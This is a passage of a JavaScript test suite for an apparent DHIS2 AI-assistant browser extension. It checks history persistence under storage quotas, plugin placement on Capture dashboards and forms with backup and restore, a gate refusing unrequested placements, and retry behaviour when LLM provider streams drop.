      if (JSON.stringify(obj).length > QUOTA) return Promise.reject(new Error('Session storage quota bytes exceeded. Values were not stored.'));
      Object.assign(saved, JSON.parse(JSON.stringify(obj)));
      return Promise.resolve();
    },
  };
  const prevMeta = d.programMetadata;
  try {
    const drugs = Array.from({ length: 4000 }, (_, i) => ({ id: `opt${i}`, code: `DRUG_${i}`, displayName: `Drug number ${i} 500 mg tablet` }));
    d.programMetadata = { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programStages: [{ id: 'pHbLWI4CaxD', programStageDataElements: Array.from({ length: 15 }, () => ({ dataElement: { optionSet: { options: drugs } } })) }] };
    vm.runInContext(`conversationHistory = [
      { role: 'user', content: 'create a plugin' },
      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'manage_custom_app', arguments: '{"action":"preview"}' } }] },
      { role: 'tool', tool_call_id: 'c1', content: '{"preview":true,"preview_token":"pv-0123456789abcdef"}' },
      { role: 'assistant', content: 'Shall I install it?' },
    ];`, ctx);
    await ctx.saveState();
    truthy('chatHistory is persisted even when the program cache is over the quota', Array.isArray(saved.chatHistory) && saved.chatHistory.length === 4 && /pv-0123456789abcdef/.test(JSON.stringify(saved.chatHistory)));
    truthy('the oversized programMetadata is left out of dhis2Full (re-fetched after a restart)', saved.dhis2Full && !saved.dhis2Full.programMetadata && saved.dhis2Full.baseUrl === d.baseUrl);
    d.programMetadata = { id: 'small1', displayName: 'Small program', programStages: [] };
    await ctx.saveState();
    truthy('a normal-size programMetadata is still persisted', saved.dhis2Full && saved.dhis2Full.programMetadata && saved.dhis2Full.programMetadata.id === 'small1');
    // A history that alone is over the quota keeps its most recent turns.
    const big = 'x'.repeat(200_000);
    vm.runInContext(`conversationHistory = ${JSON.stringify(Array.from({ length: 6 }, (_, i) => [{ role: 'user', content: `turn ${i} ${big}` }, { role: 'assistant', content: `answer ${i}` }]).flat())};`, ctx);
    await ctx.saveState();
    truthy('an over-quota history is halved until it fits, newest turns kept', Array.isArray(saved.chatHistory) && saved.chatHistory.length > 0 && saved.chatHistory.length < 12 && saved.chatHistory[saved.chatHistory.length - 1].content === 'answer 5' && saved.chatHistory[0].role === 'user');
  } finally {
    chrome.storage.session = realSession;
    d.programMetadata = prevMeta;
    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
  }
  const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
  const chatHandler = agentSrc.slice(agentSrc.indexOf("case 'CHAT_MESSAGE'"), agentSrc.indexOf("case 'CHAT_MESSAGE'") + 3000);
  truthy('CHAT_MESSAGE waits for the state restore before the turn reads the history', /await stateRestored;[\s\S]{0,40}await ensureConnected\(\)/.test(chatHandler));
  truthy('CHAT_MESSAGE re-fetches a programMetadata that was not persisted', /freshCtx\.programId && !dhis2\.programMetadata/.test(chatHandler));
}

// ── Plugin placement (manage_custom_app place / unplace / placements) ────────
// Formats verified 2026-10-22 against the Capture 106.2.2 bundle and the
// Tracker Plugin Configurator's saved configs on 2.42.5.1. The server here is
// an in-memory stand-in: a place → unplace round trip must leave every key
// byte-identical (after jsonb key reordering) to where it started.
async function runPlacementChecks() {
  console.log('\nPlugin placement (dashboards · Capture pages · Capture forms):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const d = ctx.__dhis2();
  const saved = { baseUrl: d.baseUrl, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, src: ctx.loadCustomAppSource, tavily: vm.runInContext('_hasTavilyKey', ctx) };

  // Tavily: browse_dhis2_docs only exists when a key is saved.
  const arch = vm.runInContext('TOOLS', ctx).find((t) => t.function.name === 'architect_metadata');
  vm.runInContext('_hasTavilyKey = false;', ctx);
  const stripped = ctx.stripUnavailableToolActions([arch])[0].function;
  truthy('no Tavily key: browse_dhis2_docs is not offered (enum, docs_query, description)', !stripped.parameters.properties.action.enum.includes('browse_dhis2_docs') && !stripped.parameters.properties.docs_query && !/browse_dhis2_docs/.test(stripped.description));
  truthy('…and the original tool definition is left untouched', arch.function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
  vm.runInContext('_hasTavilyKey = true;', ctx);
  truthy('with a Tavily key: browse_dhis2_docs is offered', ctx.stripUnavailableToolActions([arch])[0].function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
  vm.runInContext(`_hasTavilyKey = ${saved.tavily};`, ctx);

  // Pure helpers.
  const KEY = 'ai-test-meds';
  const SRC = `http://localhost:8081/api/apps/${KEY}/plugin.html`;
  truthy('isPluginSourceOf: ai-test-meds never matches ai-test-meds-2', ctx.isPluginSourceOf(KEY, SRC) && !ctx.isPluginSourceOf(KEY, 'http://x/api/apps/ai-test-meds-2/plugin.html') && ctx.isPluginSourceOf(KEY, `/api/apps/${KEY}/plugin.html`));
  truthy('canonicalJson ignores object key order (jsonb reorders keys)', ctx.canonicalJson({ b: 1, a: [{ y: 2, x: 1 }] }) === ctx.canonicalJson({ a: [{ x: 1, y: 2 }], b: 1 }));
  const def = ctx.captureDefaultLayout('enrollmentOverviewLayout');
  eq('enrollment dashboard default = Capture 106 bundle default', [def.leftColumn.map((w) => w.name), def.rightColumn.map((w) => w.name)], [['StagesAndEvents'], ['QuickActions', 'ErrorWidget', 'WarningWidget', 'EnrollmentNote', 'FeedbackWidget', 'IndicatorWidget', 'TrackedEntityRelationship', 'ProfileWidget', 'EnrollmentWidget']]);
  const placed = ctx.layoutWithPlugin(def, KEY, SRC, 'right', 'top');
  truthy('layoutWithPlugin puts { type:"plugin", source } at the top of the right column', placed.layout.rightColumn[0].type === 'plugin' && placed.layout.rightColumn[0].source === SRC && placed.layout.rightColumn.length === 10);
  truthy('placing twice is a no-op (already placed)', ctx.layoutWithPlugin(placed.layout, KEY, SRC, 'left', 'bottom').already === true);
  const back = ctx.layoutWithoutPlugin(placed.layout, KEY);
  truthy('layoutWithoutPlugin removes it and the result is Capture\'s default again', back.removed === 1 && ctx.isDefaultCaptureLayout(back.layout, 'enrollmentOverviewLayout'));

  const stageCtx = {
    id: 'pHbLWI4CaxD', kind: 'program_stage', name: 'Visit', programId: 'vj5cpA2OOfZ', programName: 'Pharmacy', customForm: false,
    fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001', 'deNote00001'],
    fields: { deWeight001: { id: 'deWeight001', displayName: 'Weight' }, deHeight001: { id: 'deHeight001', displayName: 'Height' }, deBmi000001: { id: 'deBmi000001', displayName: 'BMI' }, deNote00001: { id: 'deNote00001', displayName: 'Note' } },
    sections: [{ id: 'secBody0001', name: 'Body', fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001'] }, { id: 'secNote0001', name: 'Notes', fieldIds: ['deNote00001'] }],
  };
  const dflt = ctx.defaultCaptureFormConfig(stageCtx);
  eq('default form config mirrors the stage sections (Configurator format)', dflt, [{ id: 'secBody0001', name: 'Body', elements: [{ id: 'deWeight001', type: 'TrackedEntityAttribute' }, { id: 'deHeight001', type: 'TrackedEntityAttribute' }, { id: 'deBmi000001', type: 'TrackedEntityAttribute' }] }, { id: 'secNote0001', name: 'Notes', elements: [{ id: 'deNote00001', type: 'TrackedEntityAttribute' }] }]);
  truthy('a stage without sections gets one untitled section with every field', (() => { const c = ctx.defaultCaptureFormConfig({ ...stageCtx, sections: [] }); return c.length === 1 && !c[0].name && c[0].elements.length === 4; })());
  eq('a stage with a custom HTML form gets only the plugin section', ctx.defaultCaptureFormConfig({ ...stageCtx, customForm: true }), []);
  const fm = [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }, { plugin_field: 'bmi', field_id: 'deBmi000001', replace_field: true }];
  const inBody = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'body', sectionName: null, position: 'bottom' });
  const bodyEls = inBody.sections[0].elements;
  truthy('form plugin goes into the named section with the Configurator\'s fieldMap shape', bodyEls[bodyEls.length - 1].type === 'plugin' && bodyEls[bodyEls.length - 1].pluginSource === SRC
    && JSON.stringify(bodyEls[bodyEls.length - 1].fieldMap[0]) === JSON.stringify({ IdFromApp: 'deWeight001', IdFromPlugin: 'weight', objectType: 'TrackedEntityAttribute' }));
  truthy('replace_field takes the field out of the form; kept fields stay', !bodyEls.some((e) => e.id === 'deBmi000001') && bodyEls.some((e) => e.id === 'deWeight001'));
  const undone = ctx.formWithoutPlugin(inBody.sections, KEY);
  truthy('removing the plugin puts the replaced field back where the plugin was → default form again', undone.removed === 1 && ctx.canonicalJson(undone.sections) === ctx.canonicalJson(dflt));
  const own = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm.slice(0, 2), section: null, sectionName: 'Calculator', position: 'top' });
  truthy('without section the plugin gets its own section (top), removed again with it', own.sections[0].name === 'Calculator' && own.sections[0].elements[0].type === 'plugin'
    && ctx.canonicalJson(ctx.formWithoutPlugin(own.sections, KEY).sections) === ctx.canonicalJson(dflt));
  truthy('placing in the same form twice keeps ONE plugin element (upsert)', ctx.formPluginElements(ctx.formWithPlugin(inBody.sections, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'Body', position: 'top' }).sections, KEY).length === 1);
  truthy('an unknown section is refused with the section list', /No section "Vitals"/.test(ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'x', source: SRC, fieldMap: fm, section: 'Vitals', position: 'top' })._error || ''));
  const code = "setFieldValue({ fieldId: 'bmi', value: x }); const w = values.weight; const t = values['temp'];";
  const al = ctx.pluginFieldAliasProblems(code, [{ plugin_field: 'weight' }, { plugin_field: 'height' }]);
  truthy('writing an unmapped alias is an error; reading one is a warning', al.errors.some((e) => /writes "bmi"/.test(e)) && al.warnings.some((w) => /values\.temp/.test(w)) && al.warnings.some((w) => /"height" is mapped but/.test(w)));
  truthy('field_map: a field outside the stage is refused', /not a data element of stage/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'zzzzzzzzzzz' }], stageCtx) || {})._error || ''));
  truthy('field_map: an alias mapped twice is refused', /mapped twice/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'deWeight001' }, { plugin_field: 'x', field_id: 'deHeight001' }], stageCtx) || {})._error || ''));

  // Round trips against an in-memory DHIS2.
  const server = {
    datastore: {
      capture: {
        enrollmentOverviewLayout: { OtherProg01: { leftColumn: [{ type: 'component', name: 'StagesAndEvents' }], rightColumn: [{ type: 'plugin', source: '/api/apps/someone-else/plugin.html' }] } },
        dataEntryForms: { otherStage1: [{ id: 's1', elements: [{ id: 'x1', type: 'TrackedEntityAttribute' }] }] },
      },
      'dhis2-ai-extension-backups': {},
    },
    dashboards: { dash0000001: { id: 'dash0000001', name: 'Ops', dashboardItems: [] } },
  };
  const original = JSON.parse(JSON.stringify(server.datastore.capture));
  const calls = [];
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    const method = o.method || 'GET';
    calls.push(`${method} ${p.split('?')[0]}`);
    if (p === 'apps') return [{ key: KEY, name: 'Medication widget', displayName: 'Medication widget', version: '1.0.0', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: SRC, plugin_type: 'CAPTURE', appState: 'OK' }, { key: 'ai-test-dash', name: 'Dash', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: 'http://localhost:8081/api/apps/ai-test-dash/plugin.html', plugin_type: 'DASHBOARD' }];
    if (p === 'dataStore') return Object.keys(server.datastore);
    let m = p.match(/^dataStore\/([^/?]+)(?:\/([^?]+))?/);
    if (m) {
      const ns = decodeURIComponent(m[1]); const k = m[2] && decodeURIComponent(m[2]);
      const space = server.datastore[ns] || (server.datastore[ns] = {});
      if (!k) return Object.keys(space);
      if (method === 'GET') return k in space ? JSON.parse(JSON.stringify(space[k])) : { _error: 'HTTP 404', _status: 404 };
      if (method === 'POST') { if (k in space) return { _error: 'HTTP 409', _status: 409 }; space[k] = JSON.parse(JSON.stringify(o.body)); return { httpStatus: 'Created' }; }
      if (method === 'PUT') { if (!(k in space)) return { _error: 'HTTP 404', _status: 404 }; space[k] = JSON.parse(JSON.stringify(o.body)); return {}; }
      if (method === 'DELETE') { delete space[k]; return {}; }
    }
    if (p.startsWith('programs/vj5cpA2OOfZ')) return { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION', programTrackedEntityAttributes: [], programSections: [] };
    if (p.startsWith('programs/eventProg01')) return { id: 'eventProg01', displayName: 'Lab', programType: 'WITHOUT_REGISTRATION' };
    if (p.startsWith('programStages?filter=id:eq:pHbLWI4CaxD')) return { programStages: [{ id: 'pHbLWI4CaxD' }] };
    if (p.startsWith('programStages?filter=')) return { programStages: [] };
    if (p.startsWith('programStages/pHbLWI4CaxD')) return { id: 'pHbLWI4CaxD', displayName: 'Visit', formType: 'SECTION', program: { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION' },
      programStageDataElements: stageCtx.fieldIds.map((id) => ({ dataElement: { id, displayName: stageCtx.fields[id].displayName, valueType: 'NUMBER' } })),
      programStageSections: [{ id: 'secBody0001', displayName: 'Body', sortOrder: 1, dataElements: [{ id: 'deWeight001' }, { id: 'deHeight001' }, { id: 'deBmi000001' }] }, { id: 'secNote0001', displayName: 'Notes', sortOrder: 2, dataElements: [{ id: 'deNote00001' }] }] };
    if (p.startsWith('dashboards?filter=')) return { dashboards: [] };
    return { _error: `unexpected ${method} ${p}` };
  };
  ctx.loadCustomAppSource = async () => ({ aiManifest: { version: '1.0.0' }, sources: { 'plugin.jsx': "const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'bmi', value: values.weight / values.height }); };" } });
  d.baseUrl = 'http://localhost:8081';
  // Placement needs to have been asked for (live 2026-10-22: the model created
  // a dashboard nobody asked for after "yes, install it").
  const asked = ctx.userAskedToPlace;
  for (const t of ['Create a dashboard plugin … and add it to a new dashboard called "ai-test LLM malaria".', 'lists them as a widget on the enrollment dashboard', 'Please create and install and enrollment plugin here that lists them as a widget here', 'Add a plugin to this Initial Assessment form that reads the weight', 'yes, place it'])
    truthy(`placement asked: "${t.slice(0, 60)}"`, asked([t]));
  for (const t of ['Build a dashboard widget that shows the number of enrollments per org unit for the selected period. Show me a preview first.', 'yes, install it', 'make an app that lists programs'])
    truthy(`no placement asked: "${t.slice(0, 60)}"`, !asked([t]));
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments. Show me a preview first." }, { role: "assistant", content: "Preview passed. Shall I install it?" }];', ctx);
  truthy('place is refused when nobody asked for a placement (nothing written)', /has not asked for this plugin to be put/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' }))._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
  vm.runInContext('lastUserText = "yes please"; conversationHistory = [{ role: "user", content: "build a medication widget" }, { role: "assistant", content: "Installed. Should I add it to the Pharmacy enrollment dashboard?" }];', ctx);
  truthy('…allowed when the user says yes to the assistant\'s placement question', vm.runInContext('placementWasRequested()', ctx) === true);
  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments" }, { role: "assistant", content: "The dashboard widget compiled. Shall I install it?" }];', ctx);
  truthy('…but "yes" to "install this dashboard widget?" is not a placement', vm.runInContext('placementWasRequested()', ctx) === false);
  vm.runInContext('lastUserText = "add it to the enrollment dashboard of Pharmacy"; conversationHistory = [];', ctx);
  d.writeAuth = { scope: 'read_only', reason: 'verify' };
  const refused = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
  truthy('place is refused on a read-only turn (write gate)', /Refused/.test(refused._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  const p1 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
  const lay = server.datastore.capture.enrollmentOverviewLayout;
  truthy('place enrollment_dashboard: Capture default + plugin written for that program only', p1.success === true && p1.started_from_capture_default === true
    && lay.vj5cpA2OOfZ.rightColumn[0].source === SRC && lay.vj5cpA2OOfZ.rightColumn.length === 10 && ctx.canonicalJson(lay.OtherProg01) === ctx.canonicalJson(original.enrollmentOverviewLayout.OtherProg01));
  const bk = server.datastore['dhis2-ai-extension-backups'][p1.backup.key];
  truthy('…the previous value was backed up first (manage_backups can restore it)', bk && bk.capture_config && bk.capture_config.key === 'enrollmentOverviewLayout' && ctx.canonicalJson(bk.capture_config.value) === ctx.canonicalJson(original.enrollmentOverviewLayout));
  truthy('an event program is refused for enrollment pages', /event program/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'eventProg01' }))._error || ''));
  truthy('a CAPTURE plugin is refused on a dashboard', /only DASHBOARD plugins/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'dashboard', dashboard_id: 'dash0000001' }))._error || ''));
  truthy('place refuses an unmapped setFieldValue alias', /writes "bmi"/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', field_map: [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }] }))._error || ''));
  const p2 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', section: 'Body', field_map: fm });
  const form = server.datastore.capture.dataEntryForms.pHbLWI4CaxD;
  truthy('place form: the stage form is written from its sections + the plugin with the field map', p2.success === true && form.length === 2 && ctx.formPluginElements(form, KEY).length === 1 && ctx.canonicalJson(server.datastore.capture.dataEntryForms.otherStage1) === ctx.canonicalJson(original.dataEntryForms.otherStage1));
  const pl = await ctx.executeManageCustomApp({ action: 'placements', key: KEY });
  truthy('placements lists the enrollment page and the form', pl.total === 2 && pl.capture_pages[0].program_id === 'vj5cpA2OOfZ' && pl.forms[0].context_id === 'pHbLWI4CaxD' && pl.forms[0].field_map.length === 3);
  truthy('placements is a discovery (read-only) action', ctx.isDiscoveryCall('manage_custom_app', { action: 'placements' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'place' }));
  const un = await ctx.executeManageCustomApp({ action: 'unplace', key: KEY });
  truthy('unplace removes it everywhere and drops the entries it created', un.success === true && un.removed.length === 2 && un.removed.every((r) => r.entry_removed === true));
  truthy('after unplace dataStore/capture is exactly as it was before (jsonb-equal)', ctx.canonicalJson(server.datastore.capture) === ctx.canonicalJson(original));
  const restore = await ctx.restoreFromBackup(p1.backup.key);
  truthy('manage_backups restore of a Capture backup rewrites the old value', restore.success === true && ctx.canonicalJson(server.datastore.capture.enrollmentOverviewLayout) === ctx.canonicalJson(original.enrollmentOverviewLayout));

  // Dashboard APP items.
  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [];', ctx);
  truthy('manage_dashboards refuses an APP item nobody asked to place (no route around place)', /not asked for this plugin to be put on a dashboard/.test((await ctx.checkDashboardAppItem('ai-test-dash'))._error || ''));
  vm.runInContext('lastUserText = "put the KPI plugin on the Ops dashboard";', ctx);
  const chk = await ctx.checkDashboardAppItem('ai-test-dash');
  truthy('a DASHBOARD plugin is a valid dashboard APP item', !!chk.app && !chk._error);
  truthy('a CAPTURE plugin is not', /not a dashboard plugin/.test((await ctx.checkDashboardAppItem(KEY))._error || ''));
  truthy('an app that is not installed is not', /No app with key/.test((await ctx.checkDashboardAppItem('ai-nope'))._error || ''));

  d.baseUrl = saved.baseUrl; d.writeAuth = saved.writeAuth;
  ctx.safeDhis2Fetch = saved.sdf; ctx.loadCustomAppSource = saved.src;
  vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
}

// ── A provider connection dropped mid-stream (Fireworks, live 2026-10-22) ────
// read() rejects, the handler called reader.cancel(), and cancel() on an
// errored stream returns a promise rejected with the same error — unhandled.
// Chrome logs it as an uncaught error; Node kills the process (it took the
// visual suite down before its cleanup ran).
async function runStreamDropChecks() {
  console.log('\nLLM stream dropped mid-response:');
  const unhandled = [];
  const onUnhandled = (e) => unhandled.push(String(e && e.message || e));
  process.on('unhandledRejection', onUnhandled);
  const savedFetch = ctx.fetch;
  try {
    vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
    for (const flavour of ['openai', 'anthropic']) {
      ctx.fetch = async () => new Response(new ReadableStream({
        start(c) {
          c.enqueue(new TextEncoder().encode(flavour === 'openai'
            ? 'data: {"choices":[{"index":0,"delta":{"content":"Hel"}}]}\n\n'
            : 'event: message_start\ndata: {"type":"message_start","message":{"id":"x","content":[]}}\n\n'));
          setTimeout(() => c.error(new TypeError('terminated')), 5);
        },
      }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
      if (flavour === 'anthropic') vm.runInContext(`_cachedProviderConfig = { ..._cachedProviderConfig, providerType: 'anthropic', apiBaseUrl: 'https://llm.invalid' };`, ctx);
      let err = null;
      try { await ctx.callProviderStreaming([{ role: 'user', content: 'hi' }], false, () => {}, [], 0); } catch (e) { err = e; }
      await new Promise((r) => setTimeout(r, 30));
      if (err && /terminated/.test(err.message) && !unhandled.length) ok(`${flavour}: the turn fails with the network error and nothing is left unhandled`);
      else bad(`${flavour}: err=${err && err.message} unhandled=${JSON.stringify(unhandled)}`);
      unhandled.length = 0;
    }
  } finally {
    ctx.fetch = savedFetch;
    vm.runInContext(`_cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };`, ctx);
    process.off('unhandledRejection', onUnhandled);
  }
}

// ── A dropped LLM connection must not end or lose the turn (2026-11-02) ──────
// "DHIS2 Logs" thread, play 2.42.7: after 15 tool calls the panel showed the bare
// "network error" and nothing else. Retries were a budget shared by the whole
// turn, and the failed turn was thrown away, so "continue" had no request to
// continue. These drive the real loop against a fake provider.
async function runStreamRecoveryChecks() {
  console.log('\nDropped LLM connection: recovery, wording and kept history:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const enc = new TextEncoder();
  const data = (delta, finish = null) => `data: ${JSON.stringify({ choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`;
  const callDeltas = (name, args) => data({ tool_calls: [{ index: 0, id: `c${Math.random().toString(36).slice(2, 8)}`, type: 'function', function: { name, arguments: args } }] });
  const sseHeaders = { status: 200, headers: { 'Content-Type': 'text/event-stream' } };
  const body = (step) => {
    if (step.call) return callDeltas(step.call, JSON.stringify(step.args || {})) + data({}, 'tool_calls') + 'data: [DONE]\n\n';
    return data({ content: step.text }) + data({}, 'stop') + 'data: [DONE]\n\n';
  };
  const dropped = (prefix) => new Response(new ReadableStream({
    start(c) { if (prefix) c.enqueue(enc.encode(prefix)); setTimeout(() => c.error(new TypeError('network error')), 1); },
  }), sseHeaders);
  const DROP = { drop: true };
  const QUERY = { call: 'dhis2_query', args: { path: 'system/info' } };

  const run = async (script, { text = 'tell me about this server', keepHistory = false, onRequest } = {}) => {
    if (!keepHistory) vm.runInContext('conversationHistory = [];', ctx);
    const events = []; const requests = [];
    const savedFetch = ctx.fetch; const savedBroadcast = ctx.broadcast;
    let n = 0;
    ctx.broadcast = (d) => { events.push(d); };
    ctx.fetch = async (url, opts) => {
      if (!String(url).startsWith('https://llm.invalid')) return new Response('{"version":"2.42"}', { status: 200, headers: { 'Content-Type': 'application/json' } });
      const step = script[Math.min(n++, script.length - 1)];
      requests.push(JSON.parse(opts.body));
      if (onRequest) onRequest(requests.length);
      if (step.status) return new Response(JSON.stringify({ error: { message: `provider said ${step.status}` } }), { status: step.status, headers: { 'Content-Type': 'application/json' } });
      if (step.drop) return dropped(step.prefix);
      return new Response(new ReadableStream({ start(c) { c.enqueue(enc.encode(body(step))); c.close(); } }), sseHeaders);
    };
    let thrown = null; let result = null;
    try { result = await ctx.runAgenticLoop(text, null, false); } catch (e) { thrown = e; }
    ctx.fetch = savedFetch; ctx.broadcast = savedBroadcast;
    const history = JSON.parse(JSON.stringify(vm.runInContext('conversationHistory', ctx)));
    return { thrown, result, events, requests, history };
  };

  const d = vm.runInContext('dhis2', ctx);
  const saved = { base: d.baseUrl, connected: d.connected, apiVersion: d.apiVersion, pageContext: d.pageContext };
  Object.assign(d, { baseUrl: 'https://dhis.invalid', connected: true, apiVersion: 42, pageContext: { appType: 'Maintenance' } });
  vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
  vm.runInContext('globalThis.__savedDropDelays = STREAM_DROP_RETRY_DELAYS_MS.splice(0, STREAM_DROP_RETRY_DELAYS_MS.length, 1, 1, 1);', ctx);
  const savedWarn = console.warn; console.warn = () => {};
  const savedLog = console.log; const quiet = (fn) => async (...a) => { console.log = () => {}; try { return await fn(...a); } finally { console.log = savedLog; } };
  const loop = quiet(run);
  try {
    let r = await loop([DROP, DROP, DROP, QUERY, DROP, DROP, DROP, { text: 'All done.' }]);
    truthy('three drops of one request, then three of the next, still finish the turn (the limit counts drops in a row)', !r.thrown && r.result && r.result.text === 'All done.');

    const dropLimit = vm.runInContext('STREAM_DROP_TURN_LIMIT', ctx);
    r = await loop([...Array.from({ length: Math.ceil(dropLimit / 3) + 1 }, () => [DROP, DROP, DROP, QUERY]).flat(), { text: 'All done.' }]);
    const droppedTimes = r.events.filter((e) => /Connection dropped/.test(e.label || '')).length;
    truthy(`…but a provider that keeps failing stops at the turn-wide limit of ${dropLimit} retries`, r.thrown && /Say "continue"/.test(r.thrown.message) && droppedTimes === dropLimit);

    r = await loop([{ drop: true, prefix: data({ content: 'Partial answer' }) }, { text: 'The whole answer.' }]);
    const iDiscard = r.events.findIndex((e) => e.type === 'AI_STREAM_DISCARD');
    truthy('a drop after text streamed is retried too, and the partial text is taken off the screen first', !r.thrown && r.result.text === 'The whole answer.' && iDiscard !== -1 && iDiscard < r.events.findIndex((e) => /Connection dropped/.test(e.label || '')));

    r = await loop([QUERY, DROP, DROP, DROP, DROP], { text: 'create an app called "DHIS2 Logs"' });
    truthy('out of retries: the user reads what happened and what to do, not the bare "network error"', r.thrown && r.thrown.message !== 'network error' && /dropped while the model was writing/.test(r.thrown.message) && /llm\.invalid/.test(r.thrown.message) && /"continue"/.test(r.thrown.message));
    truthy('…the request and the tool calls are kept for the next turn', r.history[0].role === 'user' && /DHIS2 Logs/.test(r.history[0].content) && r.history.some((m) => m.role === 'tool'));
    truthy('…closing with a note, so no tool result is left waiting for a reply', r.history[r.history.length - 1].role === 'assistant' && /Interrupted:/.test(r.history[r.history.length - 1].content));
    const calls = r.history.flatMap((m) => (m.tool_calls || []).map((c) => c.id));
    truthy('…and every kept tool call still has its result', calls.length && calls.every((id) => r.history.some((m) => m.role === 'tool' && m.tool_call_id === id)));
    const next = await loop([{ text: 'Carrying on.' }], { text: 'continue', keepHistory: true });
    truthy('"continue" then reaches the model with the original request in context', !next.thrown && next.requests[0].messages.some((m) => m.role === 'user' && /DHIS2 Logs/.test(m.content)));

    r = await loop([DROP, DROP, DROP, DROP]);
    truthy('a dropped first reply is kept as well: "continue" still has the request', r.thrown && r.history.length === 2 && r.history[0].role === 'user');

    r = await loop([{ status: 401 }]);
    truthy('a rejected key on the first request keeps its own message and adds nothing to the thread', r.thrown && /provider said 401/.test(r.thrown.message) && r.history.length === 0);
    r = await loop([QUERY, { status: 400 }]);
    truthy('a provider rejection after tools ran keeps its message, and the work done so far', r.thrown && /provider said 400/.test(r.thrown.message) && r.history.some((m) => m.role === 'tool'));

    const longPartial = callDeltas('manage_custom_app', '{"action":"preview","source":"' + 'x'.repeat(5000));
    r = await loop([{ drop: true, prefix: longPartial }, QUERY, { text: 'Done.' }]);
    const nudged = (req) => req.messages.some((m) => m.role === 'system' && /Your last reply was lost/.test(m.content || ''));
    truthy('a long tool call that was cut: the retry asks for a smaller call', nudged(r.requests[1]) && r.requests[1].messages.some((m) => /SHORTER source/.test(m.content || '')));
    truthy('…and that request is dropped once a reply arrives', !nudged(r.requests[2]) && !r.history.some((m) => /Your last reply was lost/.test(m.content || '')));
    r = await loop([{ drop: true, prefix: callDeltas('dhis2_query', '{"path":"sys') }, { text: 'Done.' }]);
    truthy('a short cut retries the same request, with no such note', !nudged(r.requests[1]) && r.result.text === 'Done.');

    r = await loop([DROP, { text: 'Never read.' }], { onRequest: (n) => { if (n === 1) vm.runInContext('conversationEpoch++;', ctx); } });
    truthy('a thread reset during the retry wait ends the old turn and keeps nothing of it', !r.thrown && r.result.aborted && r.requests.length === 1 && r.history.length === 0);
  } finally {
    console.warn = savedWarn; console.log = savedLog;
    vm.runInContext('STREAM_DROP_RETRY_DELAYS_MS.splice(0, STREAM_DROP_RETRY_DELAYS_MS.length, ...globalThis.__savedDropDelays); conversationHistory = []; _cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };', ctx);
    Object.assign(d, { baseUrl: saved.base, connected: saved.connected, apiVersion: saved.apiVersion, pageContext: saved.pageContext });
  }
}

// ── "DHIS2 Logs" thread: job ids and guessed log endpoints (2026-11-02) ──────
